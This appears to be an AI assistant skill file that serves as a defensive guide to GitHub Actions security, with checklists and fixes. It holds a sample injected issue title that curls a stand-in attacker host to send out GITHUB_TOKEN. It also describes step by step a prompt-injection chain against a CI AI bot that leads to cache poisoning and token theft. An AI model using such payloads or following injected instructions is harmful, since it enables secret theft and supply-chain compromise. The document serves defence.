---
name: cicd-pipeline-security
description: Security review and hardening for GitHub Actions CI/CD pipelines. Use when reviewing workflow files (.github/workflows/), auditing third-party actions, checking secret exposure in CI, reviewing deployment pipelines, or investigating CI/CD supply chain attacks. Covers the tj-actions/changed-files compromise (23K repos, March 2025), Trivy GitHub Actions compromise (March 2026), Clinejection (prompt injection → cache poisoning → npm publish, Feb 2026), Shai Hulud attacks, workflow injection via issue/PR titles, cache poisoning, secret exfiltration, and the full taxonomy of GitHub Actions attack vectors.
---

# CI/CD Pipeline Security

## Why This Is Critical

Our builds run on GitHub Actions. A compromised workflow means:
- **All repository secrets stolen** (API keys, deploy tokens, npm tokens)
- **Malicious code injected into every build** (supply chain attack on our users)
- **Deployments compromised** (push malicious code to production)
- **Lateral movement** (use stolen tokens to access other repos/services)

**Scale of attacks (2025-2026)**:
- tj-actions/changed-files: 23,000 repos compromised (March 2025)
- Trivy GitHub Actions: credential stealer via poisoned action releases (March 2026)
- Clinejection: prompt injection → cache poison → published malicious npm package to 5M+ users (Feb 2026)
- Shai Hulud: ongoing campaign scanning for misconfigured workflows

## Attack Vector 1: Third-Party Action Compromise

### The Attack
Attacker gains control of a popular GitHub Action (via stolen maintainer token, social engineering, or dependency confusion). Pushes malicious version that steals secrets from every workflow that uses it.

### tj-actions/changed-files (23K repos)
```yaml
# VULNERABLE — uses mutable tag
- uses: tj-actions/changed-files@v35  # Tag can be retargeted to malicious commit
```

The attacker retargeted the `v35` tag to a commit containing a credential stealer. Every CI run that used `@v35` immediately started exfiltrating secrets.

### Detection in Workflow Review
- [ ] **Pin actions to full commit SHA**, not tags or branches:
```yaml
# DANGEROUS — mutable reference
- uses: tj-actions/changed-files@v35

# SAFE — immutable commit SHA
- uses: tj-actions/changed-files@abc123def456789...
```
- [ ] **Audit all third-party actions** in `.github/workflows/`
- [ ] **Check if action is widely used and actively maintained** — abandoned actions are takeover targets
- [ ] **Review what permissions the action needs** — does it really need `contents: write`?

### Fix: Dependabot for Actions
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

## Attack Vector 2: Workflow Injection (Expression Injection)

### The Attack
User-controlled text (issue title, PR title, commit message, branch name) is interpolated into workflow expressions without sanitization → arbitrary command execution.

```yaml
# VULNERABLE — issue title injected into shell command
- name: Check issue
  run: echo "Processing issue: ${{ github.event.issue.title }}"
  # Attacker creates issue with title: "; curl https://attacker.com/steal?token=$GITHUB_TOKEN"
```

### All Dangerous Contexts
These all contain attacker-controlled data:
```
github.event.issue.title
github.event.issue.body
github.event.pull_request.title
github.event.pull_request.body
github.event.comment.body
github.event.review.body
github.event.head_commit.message
github.event.head_commit.author.name
github.event.commits[*].message
github.head_ref  (branch name from fork)
```

### Detection in Workflow Review
- [ ] Search all workflow files for `${{` expressions that reference `github.event.*` user-controlled fields
- [ ] Any such expression in a `run:` block = INJECTION RISK
- [ ] Even in `if:` conditions, expressions can be dangerous with `contains()`

### Fix: Use Environment Variables
```yaml
# SAFE — environment variable, not shell interpolation
- name: Check issue
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: echo "Processing issue: $ISSUE_TITLE"
  # Shell treats $ISSUE_TITLE as a single string, not commands
```

## Attack Vector 3: Cache Poisoning (Clinejection)

### The Attack Chain
1. Low-privilege workflow writes to GitHub Actions cache (any workflow on default branch can)
2. Attacker poisons cache entries with malicious `node_modules`
3. High-privilege workflow (release/deploy) restores poisoned cache
4. Attacker's code runs with release secrets (npm tokens, deploy keys)

### The Clinejection Chain (Feb 2026)
```
1. AI triage bot triggered by issue title (prompt injection)
2. Claude Code runs npm install from attacker-controlled commit
3. Malicious preinstall script deploys Cacheract (cache poisoning tool)
4. Cacheract fills cache >10GB → LRU eviction of legitimate entries
5. Poisoned cache entries match nightly release workflow keys
6. Nightly workflow at 2 AM restores poisoned cache
7. Attacker exfiltrates VSCE_PAT, OVSX_PAT, NPM_RELEASE_TOKEN
8. Publishes malicious update to 5M+ users
```

### Detection
- [ ] Do any workflows share cache with release/deploy workflows?
- [ ] Do release workflows use `actions/cache` or `actions/setup-node` with caching?
- [ ] Can low-privilege workflows (triage, labeling, linting) write to cache?
- [ ] Are nightly/release credentials scoped differently from production?

### Fix
```yaml
# Isolate cache between workflow types
# Use unique cache keys per workflow purpose
- uses: actions/cache@v4
  with:
    path: node_modules
    key: release-${{ runner.os }}-${{ hashFiles('package-lock.json') }}
    # Different prefix than triage/CI workflows
```

Better: Don't cache `node_modules` at all in release workflows. Fresh install is slower but immune to cache poisoning.

## Attack Vector 4: Excessive Permissions

### The Attack
Workflows with `permissions: write-all` or broad token scopes give attackers maximum blast radius when any other vector is exploited.

### Detection
- [ ] Check for `permissions:` at workflow and job level
- [ ] Default `GITHUB_TOKEN` permissions should be `read-only`
- [ ] Release/deploy jobs should have minimum required permissions
- [ ] No workflow should have `permissions: write-all` unless absolutely necessary

### Fix: Principle of Least Privilege
```yaml
# Repository settings → Actions → General → Workflow permissions
# Set to "Read repository contents and packages permissions"

# Per-workflow override only what's needed
permissions:
  contents: read
  pull-requests: write  # Only if needed
```

## Attack Vector 5: Fork PR Attacks

### The Attack
Attacker forks repo, adds malicious code to workflow or PR, submits PR. If the workflow runs on `pull_request_target` instead of `pull_request`, it runs with the BASE repo's secrets.

```yaml
# DANGEROUS — runs with base repo secrets on PR from forks
on: pull_request_target

# SAFE — runs with fork's context, no access to base secrets
on: pull_request
```

### Detection
- [ ] Any workflow using `pull_request_target` trigger
- [ ] Any workflow that checks out PR code: `actions/checkout@v4` with `ref: ${{ github.event.pull_request.head.sha }}`
- [ ] Combined: `pull_request_target` + checkout of PR code + secret access = CRITICAL

## Attack Vector 6: AI Bot Exploitation

### The Pattern (Clinejection)
AI bots in CI (Claude Code, Copilot, Cline) that:
1. Read issue/PR content (attacker-controlled)
2. Have shell/file access (Bash, Write tools)
3. Run on default branch (cache access)

= Prompt injection → code execution → secret theft

### Detection
- [ ] Any workflow that invokes an AI agent with tool access
- [ ] AI agent reads user-submitted content (issues, PRs, comments)
- [ ] AI agent has `Bash` or file write permissions
- [ ] `allowed_non_write_users: "*"` (any user can trigger)

### Fix
- Restrict AI bot triggers to maintainers/collaborators only
- Remove Bash/Write tool permissions from AI agents in CI
- Never let AI bots run `npm install` from user-referenced code
- Isolate AI workflow runners from release infrastructure

## Workflow Hardening Checklist

### Actions
- [ ] All third-party actions pinned to commit SHAs
- [ ] Dependabot configured for GitHub Actions updates
- [ ] Audit third-party actions quarterly for maintainer changes

### Permissions
- [ ] Repository default: read-only `GITHUB_TOKEN`
- [ ] Each workflow specifies minimal `permissions:`
- [ ] Release workflows use environment-scoped secrets (require approval)

### Secrets
- [ ] Secrets scoped to specific environments (production, staging)
- [ ] Environment protection rules require reviewer approval for deploy
- [ ] No secrets in workflow logs (check for `echo $SECRET`)
- [ ] Secrets rotated after any suspected compromise

### Injection
- [ ] No `${{ github.event.* }}` in `run:` blocks without env var wrapping
- [ ] No `pull_request_target` with PR code checkout
- [ ] AI bots don't have shell access to user-controlled content

### Caching
- [ ] Release workflows use fresh installs, not cached dependencies
- [ ] If caching is required, cache keys are workflow-specific
- [ ] Monitor for unexpected cache misses (sign of poisoning)

## References

For supply chain attacks on npm packages, see `supply-chain-audit` skill.
For AI agent exploitation, see `agent-prompt-injection-defense` skill.
